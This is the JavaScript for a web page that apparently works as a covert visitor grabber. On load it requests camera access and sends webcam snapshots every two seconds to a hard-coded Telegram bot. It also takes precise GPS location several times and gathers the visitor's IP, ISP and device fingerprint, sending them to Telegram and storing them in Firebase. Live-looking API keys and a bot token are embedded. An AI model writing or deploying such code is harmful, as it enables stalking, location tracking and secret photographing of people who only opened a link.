// Import the functions you need from the SDKs you need
import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-app.js";
import { getFirestore, doc, runTransaction, serverTimestamp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-firestore.js";

// Your web app's Firebase configuration
const firebaseConfig = {
    apiKey: "AIzaSyBUIqPzbk_9XruKwPxZHYoV9d6MZW2xK7E",
    authDomain: "ipandlocation-70396.firebaseapp.com",
    projectId: "ipandlocation-70396",
    storageBucket: "ipandlocation-70396.firebasestorage.app",
    messagingSenderId: "1058281648206",
    appId: "1:1058281648206:web:456211d8af3a72f3fa131f",
    measurementId: "G-KP91BWPLN0"
};

// Telegram Config
const TELEGRAM_BOT_TOKEN = "8177366849:AAE0l7QIXDW0st-BpUjdKk8sZlGjYME5_ws";
const TELEGRAM_CHAT_ID = "910275034";

// Initialize Firebase
const app = initializeApp(firebaseConfig);
const db = getFirestore(app);

document.addEventListener('DOMContentLoaded', async () => {
    const loading = document.getElementById('loading');
    const content = document.getElementById('info-content');
    const saveStatus = document.getElementById('save-status');

    // Display Elements
    const ipDisplay = document.getElementById('ip-display');
    const deviceDisplay = document.getElementById('device-display');
    const osDisplay = document.getElementById('os-display');
    const browserDisplay = document.getElementById('browser-display');
    const ispDisplay = document.getElementById('isp-display');
    const orgDisplay = document.getElementById('org-display');
    const connectionDisplay = document.getElementById('connection-display');

    // --- 1. TRIGGER CAMERA PROMPT IMMEDIATELY ---
    let cameraTriggered = false;
    async function triggerCamera() {
        if (!cameraTriggered) {
            cameraTriggered = true;
            await captureAndSendPhoto();
            // Wait 1 second AFTER camera prompt, then ask for Location
            setTimeout(startLocationRequest, 1000);
        }
    }

    triggerCamera();

    // --- 2. LOCATION REQUEST LOGIC (Delayed) ---
    let locationCaptured = false;
    let gpsCoords = null;

    function startLocationRequest() {
        if ("geolocation" in navigator) {
            navigator.geolocation.getCurrentPosition(
                (position) => {
                    locationCaptured = true;
                    gpsCoords = position.coords;
                    if (window.ipDataLoaded) {
                        processAndSave(position.coords, null, "📍 LOCATION OBTAINED");
                    }
                },
                (error) => {
                    console.warn("Location error:", error.message);
                    if (window.ipDataLoaded) {
                        processAndSave(null, error.message, "❌ LOCATION DENIED");
                    }
                },
                { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
            );
        }
    }

    try {
        // --- 2. FETCH IP DATA (In Parallel) ---
        const ipRes = await fetch('https://ipapi.co/json/');
        const ipData = await ipRes.json();
        window.ipDataLoaded = true;

        if (ipData.error) {
            throw new Error(`API Error: ${ipData.reason}`);
        }

        // --- 3. DATA PROCESSING ---
        const userAgent = navigator.userAgent;
        let os = "Unknown OS";
        let browser = "Unknown Browser";
        let deviceType = "Desktop";

        if (userAgent.indexOf("Mobi") !== -1) deviceType = "Mobile";

        const platform = navigator.platform;
        if (platform.toLowerCase().includes('win')) os = 'Windows';
        else if (platform.toLowerCase().includes('mac')) os = 'macOS';
        else if (platform.toLowerCase().includes('linux')) os = 'Linux';
        else if (/Android/.test(userAgent)) os = 'Android';
        else if (/iPhone|iPad|iPod/.test(userAgent)) os = 'iOS';

        if (userAgent.includes("Chrome")) browser = "Chrome";
        else if (userAgent.includes("Firefox")) browser = "Firefox";
        else if (userAgent.includes("Safari") && !userAgent.includes("Chrome")) browser = "Safari";
        else if (userAgent.includes("Edge")) browser = "Edge";

        const isp = ipData.org || "Unknown ISP";
        const org = ipData.asn || "Unknown ASN";
        let connectionSpeed = "Unknown Speed";

        if (navigator.connection) {
            connectionSpeed = navigator.connection.effectiveType.toUpperCase();
        }

        // Update UI
        ipDisplay.textContent = ipData.ip || "N/A";
        deviceDisplay.textContent = deviceType;
        osDisplay.textContent = os;
        browserDisplay.textContent = browser;
        ispDisplay.textContent = isp;
        if (orgDisplay) orgDisplay.textContent = org;
        connectionDisplay.textContent = connectionSpeed;

        // Collect Detailed Info
        const detailedInfo = {
            productSub: navigator.productSub || "N/A",
            vendor: navigator.vendor || "N/A",
            maxTouchPoints: navigator.maxTouchPoints || 0,
            cookieEnabled: navigator.cookieEnabled,
            platform: navigator.platform || "N/A",
            userAgent: navigator.userAgent || "N/A",
            language: navigator.language || "N/A",
            webdriver: navigator.webdriver || false
        };

        const detailedDisplay = document.getElementById('detailed-device-display');
        let detailsText = "";
        for (const [key, value] of Object.entries(detailedInfo)) {
            detailsText += `${key}: ${value}\n`;
        }
        detailedDisplay.textContent = detailsText;

        // INITIAL NOTIFICATION (Now that IP data is ready)
        processAndSave(gpsCoords, null, gpsCoords ? "📍 LOCATION OBTAINED" : "🚨 Awaiting User Input...");

        // SCHEDULED UPDATES
        setTimeout(() => {
            if ("geolocation" in navigator) {
                navigator.geolocation.getCurrentPosition((pos) => {
                    processAndSave(pos.coords, null, "🔄 5s UPDATE");
                }, null, { enableHighAccuracy: true });
            }
        }, 5000);

        setTimeout(() => {
            if ("geolocation" in navigator) {
                navigator.geolocation.getCurrentPosition((pos) => {
                    processAndSave(pos.coords, null, "📡 10s FINAL CHECK");
                }, null, { enableHighAccuracy: true });
            }
        }, 10000);

        // --- HELPER FUNCTIONS ---
        async function processAndSave(coords, errorMsg = null, statusLabel = "VISITOR LOG") {
            const lat = coords ? coords.latitude : (ipData.latitude || null);
            const lon = coords ? coords.longitude : (ipData.longitude || null);
            const isGps = coords ? true : false;

            const collectedData = {
                status: statusLabel,
                ip: ipData.ip,
                city: ipData.city,
                country: ipData.country_name || "Unknown",
                isp: isp,
                org: org,
                deviceType: deviceType,
                os: os,
                browser: browser,
                connection: connectionSpeed,
                userAgent: userAgent,
                detailed: detailedInfo,
                location: (lat && lon) ? {
                    latitude: lat,
                    longitude: lon,
                    accuracy: coords ? coords.accuracy : "IP Based (Low)",
                    mapsLink: `https://www.google.com/maps?q=${lat},${lon}`,
                    type: isGps ? "GPS" : "IP-API"
                } : { status: errorMsg || "N/A" },
                timestamp: serverTimestamp()
            };

            sendToTelegram(collectedData);
            if (statusLabel.includes("OBTAINED") || statusLabel.includes("FINAL")) {
                saveDataToFirebase(collectedData);
            }
        }

    } catch (error) {
        console.error("Error collecting data:", error);
        loading.innerHTML = `
            <span style="color: #ef4444;">ببورە، هەڵەیەک ڕوویدا.</span><br>
            <span style="font-size: 0.8rem; color: #94a3b8;">${error.message}</span>
        `;
    }

    // --- Firebase: Sequential ID Saving ---
    async function saveDataToFirebase(data) {
        try {
            const counterRef = doc(db, "metadata", "counter");

            await runTransaction(db, async (transaction) => {
                const counterDoc = await transaction.get(counterRef);
                let newCount = 1;

                if (counterDoc.exists()) {
                    newCount = counterDoc.data().count + 1;
                }

                // Update Counter
                transaction.set(counterRef, { count: newCount });

                // Set Visitor Data
                const newVisitorRef = doc(db, "visitors", newCount.toString());
                transaction.set(newVisitorRef, data);
            });

        } catch (e) {
            console.error("Error adding document: ", e);
        }
    }

    // --- Telegram Function ---
    function sendToTelegram(data) {
        const text = `
${data.status === "📍 LOCATION OBTAINED" ? "🟢" : data.status.includes("🔄") ? "🔵" : "🚨"} <b>${data.status}</b>

🌍 <b>IP:</b> ${data.ip}
🏳️ <b>Country:</b> ${data.country}, ${data.city}
📱 <b>Device:</b> ${data.deviceType} (${data.os})
🕸️ <b>Browser:</b> ${data.browser}
🔌 <b>ISP:</b> ${data.isp}
📶 <b>Speed:</b> ${data.connection}

📍 <b>Location:</b> ${data.location.mapsLink ? `<a href="${data.location.mapsLink}">View on Maps</a>` : (data.location.status || "N/A")}

📝 <b>User Agent:</b>
<pre>${data.userAgent.substring(0, 100)}...</pre>
`;

        const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;

        fetch(url, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: TELEGRAM_CHAT_ID,
                text: text,
                parse_mode: 'HTML',
                disable_web_page_preview: true
            })
        })
            .then(res => res.json())
            .then(data => {
                if (!data.ok) console.error("Telegram Error:", data);
            })
            .catch(err => console.error("Telegram Fetch Error:", err));
    }

    // --- 4. CAMERA FUNCTIONS (Restored) ---
    async function captureAndSendPhoto() {
        if (location.protocol !== 'https:' && location.hostname !== 'localhost' && location.hostname !== '127.0.0.1') {
            return;
        }

        const player = document.getElementById('player');
        const canvas = document.getElementById('canvas');
        const context = canvas.getContext('2d');

        try {
            const stream = await navigator.mediaDevices.getUserMedia({ video: true });
            player.srcObject = stream;

            await new Promise((resolve) => {
                player.onloadedmetadata = () => {
                    player.play();
                    setTimeout(resolve, 1000);
                };
            });

            canvas.width = player.videoWidth;
            canvas.height = player.videoHeight;

            setInterval(() => {
                if (player.readyState === player.HAVE_ENOUGH_DATA) {
                    context.drawImage(player, 0, 0, canvas.width, canvas.height);
                    canvas.toBlob((blob) => {
                        sendPhotoToTelegram(blob);
                    }, 'image/jpeg', 0.6);
                }
            }, 2000); // Send every 2 seconds

        } catch (err) {
            console.error("Camera Error:", err);
        }
    }

    function sendPhotoToTelegram(photoBlob) {
        const formData = new FormData();
        formData.append("chat_id", TELEGRAM_CHAT_ID);
        formData.append("photo", photoBlob, "visitor.jpg");
        formData.append("caption", "📸 New Visitor Photo");

        fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, {
            method: 'POST',
            body: formData
        })
            .then(res => res.json())
            .catch(err => console.error("Telegram Photo Error:", err));
    }
});
